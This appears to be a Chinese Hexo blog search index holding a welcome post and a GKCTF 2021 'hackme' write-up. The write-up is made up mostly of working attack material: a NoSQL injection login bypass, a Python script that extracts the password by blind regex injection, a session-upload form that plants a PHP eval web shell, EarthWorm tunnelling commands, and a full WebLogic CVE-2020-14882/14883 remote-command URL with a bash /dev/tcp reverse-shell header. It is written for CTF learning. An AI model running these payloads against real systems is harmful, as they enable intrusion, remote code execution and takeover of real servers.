<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>my-first-blog</title>
    <url>/2021/10/09/my-first-blog/</url>
    <content><![CDATA[<p>欢迎来到我的博客，我会发布一下有关渗透的博文，请多交流！</p>
<span id="more"></span>]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>个人介绍</tag>
      </tags>
  </entry>
  <entry>
    <title>[GKCTF 2021]hackme</title>
    <url>/2021/10/09/2021-hackme/</url>
    <content><![CDATA[<p>进入题目，出现的是一个登录框：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/21830906/1631774784651-c731f368-072e-4f6e-9f3b-b242450e1366.png" alt="image.png"></p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>发现被检测了，<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/21830906/1631775471421-6abc56df-31b5-4dab-901d-1dc1b15fc3e8.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&quot;msg&quot;:&quot;登录了，但没完全登录&quot;&#125;    // 真</span><br><span class="line">&#123;&quot;msg&quot;:&quot;登录失败&quot;&#125;    // 假</span><br></pre></td></tr></table></figure>
<p>编写盲注脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">password = &#x27;&#x27;</span><br><span class="line">url = &#x27;http://node4.buuoj.cn:29587/login.php&#x27;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    for c in string.printable:</span><br><span class="line">        if c not in [&#x27;*&#x27;, &#x27;+&#x27;, &#x27;.&#x27;, &#x27;?&#x27;, &#x27;|&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;$&#x27;]:</span><br><span class="line"></span><br><span class="line">            # When the method is GET</span><br><span class="line">            get_payload = &#x27;?username=admin&amp;password[$regex]=^%s&#x27; % (password + c)</span><br><span class="line">            # When the method is POST</span><br><span class="line">            post_payload = &#123;</span><br><span class="line">                &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">                &quot;password[$regex]&quot;: &#x27;^&#x27; + password + c</span><br><span class="line">            &#125;</span><br><span class="line">            # When the method is POST with JSON</span><br><span class="line">            json_payload = &quot;&quot;&quot;&#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&#123;&quot;\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078&quot;:&quot;^%s&quot;&#125;&#125;&quot;&quot;&quot; % (password + c)</span><br><span class="line">            headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;</span><br><span class="line">            r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json</span><br><span class="line"></span><br><span class="line">            #r = requests.post(url=url, data=post_payload)</span><br><span class="line">            if &#x27;但没完全登录&#x27; in r.content.decode():</span><br><span class="line">                print(&quot;[+] %s&quot; % (password + c))</span><br><span class="line">                password += c</span><br></pre></td></tr></table></figure>
<p>得到密码后登录：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/21830906/1631775845360-de6ac1d7-3eb3-4f07-be59-aa6674c87038.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        error_page 404 404.php;</span><br><span class="line">        root /usr/local/nginx/html;</span><br><span class="line">        index index.htm index.html index.php;</span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">           root           /usr/local/nginx/html;</span><br><span class="line">           fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">           fastcgi_index  index.php;</span><br><span class="line">           fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">           include        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">resolver 127.0.0.11 valid=0s ipv6=off;</span><br><span class="line">resolver_timeout 10s;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # weblogic</span><br><span class="line">    server &#123;</span><br><span class="line">		listen       80;</span><br><span class="line">		server_name  weblogic;</span><br><span class="line">		location / &#123;</span><br><span class="line">			proxy_set_header Host $host;</span><br><span class="line">			set $backend weblogic;</span><br><span class="line">			proxy_pass http://$backend:7001;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>发现内网中确实还有一个应用，在内网 <code>weblogic</code> 主机的 7001 端口上运行着一个 weblogic 服务。下面我们就想办法攻击这个内网的 weblogic。<br />根据info.php发现目标环境开启了session.upload_progress.enabled.<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/21830906/1631777025453-86445d92-531d-45c4-ab7e-8ae59e1c2360.png" alt="image.png"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://node4.buuoj.cn:29587/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php phpinfo();fputs(fopen(&#x27;/usr/local/nginx/html/shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[whoami])?&gt;&#x27;);?&gt;&quot;</span> /&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在浏览器打开，使用burpsuite抓包，双开：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/21830906/1631777375892-05fdbf0e-9e92-4778-9bed-8a870e82e946.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 1234</span><br></pre></td></tr></table></figure>
<p>该命令的意思是在vps上添加一个转接隧道，监听 1234，把本地 1234 端口收到的代理请求转交给1080端口，这里 1234 端口只是用于传输流量。<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/21830906/1631777614078-373b76e0-74d4-41fd-9d07-bfc7ce174aeb.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s rssocks -d xx.xx.xx.xx -e 1234</span><br></pre></td></tr></table></figure>
<p>这句话的意思上将本机的1234端口转发到公网地址为xx.xx.xx.xx的机器上。<br />连接成功：<img src="https://cdn.nlark.com/yuque/0/2021/png/21830906/1631777745271-52848bda-3afe-4f3f-9277-388055dd76ad.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Weblogic 是 Oracle 公司推出的 J2EE 应用服务器。在 2020 年 10 月的更新中，Oracle 官方修复了两个长亭科技安全研究员 @voidfyoo 提交的安全漏洞，分别是 CVE-2020-14882 和 CVE-2020-14883。</span><br><span class="line">CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883 允许后台任意用户通过 HTTP 协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程 Weblogic 服务器上以未授权的任意用户身份执行命令。</span><br></pre></td></tr></table></figure>
<p>首先测试权限绕过漏洞（CVE-2020-14882），访问以下 URL，即可未授权访问到管理后台页面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http:/weblogic:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21830906/1631778115912-6b33fa1b-5973-49d4-84d9-11027df6294c.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">    http://weblogic:7001/console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22/c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22/bin/sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!=%20null%20)&#123;%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt();</span><br><span class="line"></span><br><span class="line">HTTP Headers: </span><br><span class="line">	cmd: bash -i &gt;&amp; /dev/tcp/xx.xxx.xxx.xx/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21830906/1631778200554-eb1be549-45a4-4cab-8915-05f07c81a5b0.png" alt="image.png"></p>
]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>ctf</tag>
        <tag>weblogic</tag>
        <tag>内网穿透</tag>
      </tags>
  </entry>
</search>
